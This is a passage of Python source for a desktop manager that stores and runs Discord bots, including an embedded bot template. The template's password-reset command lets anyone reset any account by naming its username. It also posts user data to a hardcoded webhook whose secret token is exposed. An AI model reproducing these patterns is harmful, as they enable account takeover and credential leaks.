                "    embed.add_field(name='$updateapp', value='Signal the app to update (owner only)', inline=False)\n"
                "    await ctx.send(embed=embed)\n"
                "@bot.command(name='forgot_password')\n"
                "async def forgot_password(ctx):\n"
                "    await ctx.send(embed=discord.Embed(description='Check your DMs for instructions.', color=discord.Color.orange()))\n"
                "    try:\n"
                "        await ctx.author.send('Let's reset your BotSail password!\\n\\nPlease reply with your BotSail username or type `cancel` to stop.')\n"
                "        def user_check(m):\n"
                "            return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)\n"
                "        while True:\n"
                "            try:\n"
                "                msg = await bot.wait_for('message', check=user_check, timeout=120)\n"
                "            except asyncio.TimeoutError:\n"
                "                await ctx.author.send('You took too long. Please start over with `$forgot_password`.')\n"
                "                return\n"
                "            username = msg.content.strip()\n"
                "            if username.lower() == 'cancel':\n"
                "                await ctx.author.send('Password reset cancelled.')\n"
                "                return\n"
                "            if not os.path.exists('users.json'):\n"
                "                await ctx.author.send('No BotSail users database found.')\n"
                "                return\n"
                "            with open('users.json', 'r') as f:\n"
                "                try:\n"
                "                    users = json.load(f)\n"
                "                except Exception:\n"
                "                    users = {}\n"
                "            if username not in users:\n"
                "                await ctx.author.send('That username doesn\'t exist. Please try again or type `cancel`.')\n"
                "                continue\n"
                "            break\n"
                "        await ctx.author.send('Now type your new password (at least 5 characters) or `cancel`.')\n"
                "        while True:\n"
                "            try:\n"
                "                pwmsg = await bot.wait_for('message', check=user_check, timeout=120)\n"
                "            except asyncio.TimeoutError:\n"
                "                await ctx.author.send('You took too long. Please start over with `$forgot_password`.')\n"
                "                return\n"
                "            newpw = pwmsg.content.strip()\n"
                "            if newpw.lower() == 'cancel':\n"
                "                await ctx.author.send('Password reset cancelled.')\n"
                "                return\n"
                "            if len(newpw) < 5:\n"
                "                await ctx.author.send('Password too short. Please try again or type `cancel`.')\n"
                "                continue\n"
                "            if update_user_password(username, newpw):\n"
                "                await ctx.author.send('Your password has been reset. You can now log in to BotSail with your new password.')\n"
                "            else:\n"
                "                await ctx.author.send('Something went wrong. Please try again or contact support.')\n"
                "            break\n"
                "    except Exception:\n"
                "        await ctx.author.send('An error occurred. Please try again or contact support.')\n"
                "@bot.command(name='blacklist')\n"
                "async def blacklist(ctx, member: discord.Member, username):\n"
                "    if not has_access(ctx.author):\n"
                "        embed = discord.Embed(description='Sorry you don\'t have access to these commands.', color=discord.Color.red())\n"
                "        await ctx.author.send(embed=embed)\n"
                "        return\n"
                "    blacklist_user(member.id, username)\n"
                "    embed = discord.Embed(description=f'User `{username}` and Discord ID `{member.id}` has been blacklisted from the app.', color=discord.Color.red())\n"
                "    await ctx.send(embed=embed)\n"
                "@bot.command(name='unblacklist')\n"
                "async def unblacklist(ctx, member: discord.Member, username):\n"
                "    if not has_access(ctx.author):\n"
                "        embed = discord.Embed(description='Sorry you don\'t have access to these commands.', color=discord.Color.red())\n"
                "        await ctx.author.send(embed=embed)\n"
                "        return\n"
                "    unblacklist_user(member.id, username)\n"
                "    embed = discord.Embed(description=f'User `{username}` and Discord ID `{member.id}` has been removed from blacklist.', color=discord.Color.green())\n"
                "    await ctx.send(embed=embed)\n"
                "@bot.command(name='userinfo')\n"
                "async def userinfo(ctx, user_id, username):\n"
                "    user_verified = False\n"
                "    if os.path.exists('users.json'):\n"
                "        with open('users.json', 'r') as f:\n"
                "            try:\n"
                "                users = json.load(f)\n"
                "            except Exception:\n"
                "                users = {}\n"
                "        if username in users:\n"
                "            user_verified = True\n"
                "    embed = discord.Embed(title='User Verification', color=discord.Color.green() if user_verified else discord.Color.red())\n"
                "    embed.add_field(name='User ID', value=user_id, inline=False)\n"
                "    embed.add_field(name='Username', value=username, inline=False)\n"
                "    if user_verified:\n"
                "        embed.add_field(name='Status', value='Verified ✅', inline=False)\n"
                "        requests.post('https://discord.com/api/webhooks/1389461332507623525/uCZUDh4GZSLaAFLBlpmJlKY6VIlIWYwatf2pM5qPJj5Lfwd1tCb8pXYOklWG7aE5EHQ7', json={'embeds': [{'title': 'User Verified', 'color': 5763719, 'fields': [{'name': 'User ID', 'value': user_id, 'inline': False}, {'name': 'Username', 'value': username, 'inline': False}, {'name': 'Status', 'value': 'Verified ✅', 'inline': False}]}]})\n"
                "    else:\n"
                "        embed.add_field(name='Status', value='Not Verified ❌', inline=False)\n"
                "    await ctx.send(embed=embed)\n"
                "@bot.command(name='updateapp')\n"
                "async def updateapp(ctx):\n"
                "    if not has_access(ctx.author):\n"
                "        embed = discord.Embed(description='Sorry you don\'t have access to these commands.', color=discord.Color.red())\n"
                "        await ctx.author.send(embed=embed)\n"
                "        return\n"
                "    with open('update.flag', 'w') as f:\n"
                "        f.write('update')\n"
                "    embed = discord.Embed(description='Update signal sent. Users need to restart the app to apply updates.', color=discord.Color.green())\n"
                "    await ctx.send(embed=embed)\n"
                "@bot.command(name='shutdown')\n"
                "async def shutdown(ctx):\n"
                "    if not has_access(ctx.author):\n"
                "        embed = discord.Embed(description='Sorry you don\'t have access to these commands.', color=discord.Color.red())\n"
                "        await ctx.author.send(embed=embed)\n"
                "        return\n"
                "    embed = discord.Embed(description='Shutting down the bot...', color=discord.Color.orange())\n"
                "    await ctx.send(embed=embed)\n"
                "    await bot.close()\n"
            )
        elif lang == "JavaScript":
            return (
                "const { Client, GatewayIntentBits } = require('discord.js');\n"
                "const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });\n"
                "client.once('ready', () => {\n"
                "    client.user.setPresence({ status: 'online', activities: [{ name: 'Hello!' }] });\n"
                "    console.log(`Logged in as ${client.user.tag}`);\n"
                "});\n"
                "client.on('messageCreate', message => {\n"
                "    if (message.content === '!ping') {\n"
                "        message.channel.send('pong!');\n"
                "    }\n"
                "});\n"
            )
        elif lang == "Lua":
            return (
                "local discordia = require('discordia')\n"
                "local client = discordia.Client()\n"
                "client:on('ready', function()\n"
                "    client:setGame('Hello!')\n"
                "    print('Logged in as ' .. client.user.username)\n"
                "end)\n"
                "client:on('messageCreate', function(message)\n"
                "    if message.content == '!ping' then\n"
                "        message.channel:send('pong!')\n"
                "    end\n"
                "end)\n"
            )
        return ""
    def strip_existing_token(self, bot_code, lang, token):
        if lang == "Python":
            pat = r"bot\.run\s*\((['\"])[^'\"]*\1\)\s*"
            bot_code = re.sub(pat, "", bot_code)
        elif lang == "JavaScript":
            pat = r"client\.login\s*\((['\"])[^'\"]*\1\)\s*;"
            bot_code = re.sub(pat, "", bot_code)
        elif lang == "Lua":
            pat = r"client:run\s*\((['\"])[^'\"]*\1\)\s*"
            bot_code = re.sub(pat, "", bot_code)
        return bot_code
    def run_python_bot_daemon(self, token, code, status, status_msg):
        for attempt in range(5):
            try:
                if not self.validate_token(token):
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Invalid token for {self.bots[token]['name']} [{token[-4:]}]", "error")
                    return
                stat_map = {"online": "discord.Status.online", "idle": "discord.Status.idle", "dnd": "discord.Status.dnd", "invisible": "discord.Status.invisible"}
                custom_status = f"activity=discord.Game('{status_msg}')" if status_msg else "activity=None"
                bot_code = self.strip_existing_token(code, "Python", token)
                bot_code = bot_code.replace("discord.Status.online", stat_map.get(status, "discord.Status.online"))
                if "activity=discord.Game" in bot_code:
                    bot_code = bot_code.replace("activity=discord.Game('Hello!')", custom_status)
                bot_code += f"\nbot.run('{token}')\n"
                with tempfile.NamedTemporaryFile('w', delete=False, suffix='.py', encoding="utf-8") as temp:
                    temp.write(bot_code)
                    temp.flush()
                    cmd = ["nohup", sys.executable, temp.name] if platform.system() != "Windows" else [sys.executable, temp.name]
                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if platform.system() == "Windows" else 0)
                    self.daemon_pids[token] = (proc, temp.name)
                    self.bots[token]["running"] = True
                    self.save_pids()
                    self.update_bots_listbox()
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Started bot {self.bots[token]['name']} [{token[-4:]}] (PID={proc.pid})", "success")
                    self.status_label.config(fg="#14b859")
                    self.status_text_var.set(f"Started {self.bots[token]['name']} [{token[-4:]}]")
                    self.root.after(2000, lambda: self.status_label.config(fg="#14b859") if self.bots[token]["running"] else None)
                    threading.Thread(target=self.monitor_output, args=(token, proc, "Python"), daemon=True).start()
                    return
            except Exception as e:
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to start bot [{token[-4:]}] (attempt {attempt+1}/5): {e}", "error")
                if attempt < 4:
                    time.sleep(2)
        self.show_bot_code_error("", f"Failed to start bot after 5 attempts.", "Python")
    def run_js_bot_daemon(self, token, code, status, status_msg):
        for attempt in range(5):
            try:
                if not self.validate_token(token):
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Invalid token for {self.bots[token]['name']} [{token[-4:]}]", "error")
                    return
                stat_map = {"online": "online", "idle": "idle", "dnd": "dnd", "invisible": "invisible"}
                presence_line = f"client.user.setPresence({{ status: '{stat_map.get(status,'online')}', activities: [{{ name: '{status_msg or 'Hello!'}' }}] }});"
                bot_code = self.strip_existing_token(code, "JavaScript", token)
                if "client.user.setPresence" in bot_code:
                    bot_code = bot_code.replace("client.user.setPresence({ status: 'online', activities: [{ name: 'Hello!' }] });", presence_line)
                bot_code += f"\nclient.login('{token}');\n"
                with tempfile.NamedTemporaryFile('w', delete=False, suffix='.js', encoding="utf-8") as temp:
                    temp.write(bot_code)
                    temp.flush()
                    cmd = ["nohup", "node", temp.name] if platform.system() != "Windows" else ["node", temp.name]
                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if platform.system() == "Windows" else 0)
                    self.daemon_pids[token] = (proc, temp.name)
                    self.bots[token]["running"] = True
                    self.save_pids()
                    self.update_bots_listbox()
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Started bot {self.bots[token]['name']} [{token[-4:]}] (PID={proc.pid})", "success")
                    self.status_label.config(fg="#14b859")
                    self.status_text_var.set(f"Started {self.bots[token]['name']} [{token[-4:]}]")
                    self.root.after(2000, lambda: self.status_label.config(fg="#14b859") if self.bots[token]["running"] else None)
                    threading.Thread(target=self.monitor_output, args=(token, proc, "JavaScript"), daemon=True).start()
                    return
            except Exception as e:
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to start bot [{token[-4:]}] (attempt {attempt+1}/5): {e}", "error")
                if attempt < 4:
                    time.sleep(2)
        self.show_bot_code_error("", f"Failed to start bot after 5 attempts.", "JavaScript")
    def run_lua_bot_daemon(self, token, code, status, status_msg):
        for attempt in range(5):
            try:
                if not self.validate_token(token):
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Invalid token for {self.bots[token]['name']} [{token[-4:]}]", "error")
                    return
                activity_line = f"client:setGame('{status_msg or 'Hello!'}')"
                bot_code = self.strip_existing_token(code, "Lua", token)
                if "client:setGame('Hello!')" in bot_code:
                    bot_code = bot_code.replace("client:setGame('Hello!')", activity_line)
                bot_code += f"\nclient:run('Bot {token}')\n"
                with tempfile.NamedTemporaryFile('w', delete=False, suffix='.lua', encoding="utf-8") as temp:
                    temp.write(bot_code)
                    temp.flush()
                    cmd = ["nohup", "lua", temp.name] if platform.system() != "Windows" else ["lua", temp.name]
                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if platform.system() == "Windows" else 0)
                    self.daemon_pids[token] = (proc, temp.name)
                    self.bots[token]["running"] = True
                    self.save_pids()
                    self.update_bots_listbox()
                    self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Started bot {self.bots[token]['name']} [{token[-4:]}] (PID={proc.pid})", "success")
                    self.status_label.config(fg="#14b859")
                    self.status_text_var.set(f"Started {self.bots[token]['name']} [{token[-4:]}]")
                    self.root.after(2000, lambda: self.status_label.config(fg="#14b859") if self.bots[token]["running"] else None)
                    threading.Thread(target=self.monitor_output, args=(token, proc, "Lua"), daemon=True).start()
                    return
            except Exception as e:
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to start bot [{token[-4:]}] (attempt {attempt+1}/5): {e}", "error")
                if attempt < 4:
                    time.sleep(2)
        self.show_bot_code_error("", f"Failed to start bot after 5 attempts.", "Lua")
    def monitor_output(self, token, proc, lang):
        try:
            stdout, stderr = proc.communicate(timeout=30)
            out = stdout.decode("utf-8", errors="ignore") if stdout else ""
            err = stderr.decode("utf-8", errors="ignore") if stderr else ""
            if out or err:
                self.show_bot_code_error(out, err, lang)
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Error monitoring bot [{token[-4:]}]: {e}", "error")
    def start_selected(self):
        sel = self.bots_listbox.curselection()
        if not sel:
            messagebox.showinfo("No selection", "Select a bot to start.")
            return
        idx = sel[0]
        tokens = list(self.bots.keys())
        token = tokens[idx]
        botinfo = self.bots[token]
        if botinfo.get("running"):
            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Bot {botinfo['name']} [{token[-4:]}] is already running", "warning")
            return
        language = botinfo.get("language", "Python")
        code = self.code_cache.get(token, botinfo.get("code", ""))
        status = botinfo.get("status", DISCORD_STATUSES[0])
        status_msg = botinfo.get("status_msg", "")
        self.status_text_var.set(f"Starting {botinfo.get('name','Bot')}...")
        self.status_label.config(fg="#6366f1")
        self.root.after(100, lambda: self.status_label.config(fg="#14b859") if self.bots[token]["running"] else None)
        if language == "Python":
            threading.Thread(target=self.run_python_bot_daemon, args=(token, code, status, status_msg), daemon=True).start()
        elif language == "JavaScript":
            threading.Thread(target=self.run_js_bot_daemon, args=(token, code, status, status_msg), daemon=True).start()
        elif language == "Lua":
            threading.Thread(target=self.run_lua_bot_daemon, args=(token, code, status, status_msg), daemon=True).start()
    def stop_selected(self):
        sel = self.bots_listbox.curselection()
        if not sel:
            messagebox.showinfo("No selection", "Select a bot to stop.")
            return
        idx = sel[0]
        tokens = list(self.bots.keys())
        token = tokens[idx]
        if token in self.daemon_pids:
            proc, fname = self.daemon_pids[token]
            try:
                if proc.poll() is None:
                    os.kill(proc.pid, signal.SIGTERM)
                os.remove(fname)
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Stopped bot [{token[-4:]}], PID={proc.pid}", "success")
            except Exception as e:
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to stop bot [{token[-4:]}]: {e}", "error")
            self.bots[token]["running"] = False
            self.update_bots_listbox()
            self.daemon_pids.pop(token, None)
            self.save_pids()
            self.status_label.config(fg="#e53935")
            self.status_text_var.set(f"Stopped {self.bots[token]['name']} [{token[-4:]}]")
            self.root.after(2000, lambda: self.status_label.config(fg="#14b859") if not self.bots[token]["running"] else None)
        else:
            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} No running process for bot [{token[-4:]}]", "warning")
    def restart_selected(self):
        sel = self.bots_listbox.curselection()
        if not sel:
            messagebox.showinfo("No selection", "Select a bot to restart.")
            return
        idx = sel[0]
        tokens = list(self.bots.keys())
        token = tokens[idx]
        botinfo = self.bots[token]
        if token in self.daemon_pids:
            self.stop_selected()
        language = botinfo.get("language", "Python")
        code = self.code_cache.get(token, botinfo.get("code", ""))
        status = botinfo.get("status", DISCORD_STATUSES[0])
        status_msg = botinfo.get("status_msg", "")
        self.status_text_var.set(f"Restarting {botinfo.get('name','Bot')}...")
        self.status_label.config(fg="#6366f1")
        self.root.after(100, lambda: self.status_label.config(fg="#14b859") if self.bots[token]["running"] else None)
        if language == "Python":
            threading.Thread(target=self.run_python_bot_daemon, args=(token, code, status, status_msg), daemon=True).start()
        elif language == "JavaScript":
            threading.Thread(target=self.run_js_bot_daemon, args=(token, code, status, status_msg), daemon=True).start()
        elif language == "Lua":
            threading.Thread(target=self.run_lua_bot_daemon, args=(token, code, status, status_msg), daemon=True).start()
    def shutdown_selected(self):
        sel = self.bots_listbox.curselection()
        if not sel:
            messagebox.showinfo("No selection", "Select a bot to shut down.")
            return
        idx = sel[0]
        tokens = list(self.bots.keys())
        token = tokens[idx]
        if token in self.daemon_pids:
            proc, fname = self.daemon_pids[token]
            try:
                if proc.poll() is None:
                    if platform.system() == "Windows":
                        os.kill(proc.pid, signal.CTRL_C_EVENT)
                    else:
                        os.kill(proc.pid, signal.SIGTERM)
                os.remove(fname)
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Shut down bot [{token[-4:]}], PID={proc.pid}", "success")
            except Exception as e:
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to shut down bot [{token[-4:]}]: {e}", "error")
            self.bots[token]["running"] = False
            self.update_bots_listbox()
            self.daemon_pids.pop(token, None)
            self.save_pids()
            self.status_label.config(fg="#e53935")
            self.status_text_var.set(f"Shut down {self.bots[token]['name']} [{token[-4:]}]")
            self.root.after(2000, lambda: self.status_label.config(fg="#14b859") if not self.bots[token]["running"] else None)
        else:
            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} No running process for bot [{token[-4:]}]", "warning")
    def stop_all(self):
        for token in list(self.daemon_pids.keys()):
            proc, fname = self.daemon_pids[token]
            try:
                if proc.poll() is None:
                    os.kill(proc.pid, signal.SIGTERM)
                os.remove(fname)
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Stopped bot [{token[-4:]}], PID={proc.pid}", "success")
            except Exception as e:
                self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Failed to stop bot [{token[-4:]}]: {e}", "error")
            self.bots[token]["running"] = False
            self.daemon_pids.pop(token, None)
        self.save_pids()
        self.update_bots_listbox()
        self.status_label.config(fg="#e53935")
        self.status_text_var.set("Stopped all bots")
        self.root.after(2000, lambda: self.status_label.config(fg="#14b859"))
    def remove_selected(self):
        sel = self.bots_listbox.curselection()
        if not sel:
            messagebox.showinfo("No selection", "Select a bot to remove.")
            return
        idx = sel[0]
        tokens = list(self.bots.keys())
        token = tokens[idx]
        if token in self.daemon_pids:
            self.stop_selected()
        del self.bots[token]
        self.save_config()
        self.update_bots_listbox()
        self.code_text.delete('1.0', tk.END)
        self.selected_token = None
        self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Removed selected bot.", "success")
    def start_monitoring(self):
        def monitor():
            while True:
                for token, (proc, fname) in list(self.daemon_pids.items()):
                    try:
                        if proc.poll() is not None:
                            self.bots[token]["running"] = False
                            self.update_bots_listbox()
                            try:
                                os.remove(fname)
                            except:
                                pass
                            self.daemon_pids.pop(token, None)
                            self.save_pids()
                            self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Bot [{token[-4:]}] crashed, attempting restart...", "warning")
                            botinfo = self.bots.get(token, {})
                            if botinfo:
                                language = botinfo.get("language", "Python")
                                code = self.code_cache.get(token, botinfo.get("code", ""))
                                status = botinfo.get("status", DISCORD_STATUSES[0])
                                status_msg = botinfo.get("status_msg", "")
                                if language == "Python":
                                    self.run_python_bot_daemon(token, code, status, status_msg)
                                elif language == "JavaScript":
                                    self.run_js_bot_daemon(token, code, status, status_msg)
                                elif language == "Lua":
                                    self.run_lua_bot_daemon(token, code, status, status_msg)
                    except Exception as e:
                        self.log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} Error monitoring bot [{token[-4:]}]: {e}", "error")
                time.sleep(5)
        threading.Thread(target=monitor, daemon=True).start()

def launch_bot_manager(user):
    for widget in root.winfo_children():
        widget.destroy()
    BotManager(root, user)

if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("1100x700")
    LoginWindow(root, launch_bot_manager)
    root.mainloop()

def update_user_password(username, newpw):
    if not os.path.exists(USERS_PATH):
        return False
    with open(USERS_PATH, "r") as f:
        try:
            users = json.load(f)
        except Exception:
            users = {}
    if username not in users:
        return False
    users[username]["pw"] = hashlib.sha256(newpw.encode("utf-8")).hexdigest()
    with open(USERS_PATH, "w") as f:
        json.dump(users, f)
    return True

def load_blacklist():
    if not os.path.exists(BLACKLIST_PATH):
        return {}
    with open(BLACKLIST_PATH, "r") as f:
        try:
            data = json.load(f)
        except Exception:
            data = {}
    return data

def save_blacklist(data):
    with open(BLACKLIST_PATH, "w") as f:
        json.dump(data, f)

def blacklist_user(discord_id, username, iphash=None):
    bl = load_blacklist()
    bl[str(discord_id)] = {"username": username, "iphash": iphash}
    save_blacklist(bl)

def unblacklist_user(discord_id, username):
    bl = load_blacklist()
    key = str(discord_id)
    if key in bl:
        del bl[key]
        save_blacklist(bl)
        return
    for k, v in list(bl.items()):
        if v.get("username") == username:
            del bl[k]
    save_blacklist(bl)

def is_blacklisted(discord_id=None, username=None, iphash=None):
    bl = load_blacklist()
    key = str(discord_id) if discord_id is not None else None
    for k, v in bl.items():
        if key and k == key:
            return True
        if username and v.get("username") == username:
            return True
        if iphash and v.get("iphash") == iphash:
            return True
    return False

def has_access(member):
    return builtins.any(role.id in [1389446048572768366, 1389446042751209523] for role in member.roles)